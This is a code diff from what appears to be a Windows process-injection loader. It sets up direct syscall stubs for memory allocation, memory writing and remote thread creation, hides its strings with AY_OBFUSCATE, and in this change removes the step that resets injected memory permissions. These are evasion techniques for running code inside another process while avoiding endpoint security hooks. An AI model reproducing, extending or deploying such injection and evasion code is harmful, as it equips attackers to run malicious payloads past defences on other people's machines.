@@ -22,9 +22,6 @@ char AllocStub[SYSCALL_STUB_SIZE] = {};
 MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
 char WVMStub[SYSCALL_STUB_SIZE] = {};
 
-MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
-char ProtectStub[SYSCALL_STUB_SIZE] = {};
-
 MyNtCreateThreadEx _NtCreateThreadEx = NULL;
 char CreateThreadExStub[SYSCALL_STUB_SIZE];
 
@@ -107,20 +104,6 @@ BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID file
 	return FALSE;
 }
 
-BOOL FindProtectVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
-{
-
-	DWORD oldProtection;
-	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
-	VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-
-	if (MapSyscall(AY_OBFUSCATE("NtProtectVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, ProtectStub))
-	{
-		return TRUE;
-	}
-	return FALSE;
-}
-
 BOOL FindCreateThreadEx(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
 {
 	DWORD oldProtection;
@@ -173,8 +156,6 @@ BOOL EstablishSyscalls()
 	if (!FindAlloc(exportDirectory, fileData, textSection, rdataSection))
 		success = FALSE;
 	if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
-		success = FALSE;
-	if (!FindProtectVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
 		success = FALSE;
 	if (!FindCreateThreadEx(exportDirectory, fileData, textSection, rdataSection))
 		success = FALSE;
@@ -285,14 +266,6 @@ int main(int argc, char* argv[])
 	if (status != STATUS_SUCCESS)
 	{
 		printf(AY_OBFUSCATE("Failed to write to allocated memory\n"));
-		return FALSE;
-	}
-
-	printf(AY_OBFUSCATE("Changing memory permissions\n"));
-	status = _NtProtectVirtualMemory(hProc, &lpAllocationStart, &szAllocation, PAGE_EXECUTE_READ, &oldProtect);
-	if (status != STATUS_SUCCESS)
-	{
-		printf(AY_OBFUSCATE("Unable to change memory permissions\n"));
 		return FALSE;
 	}
 
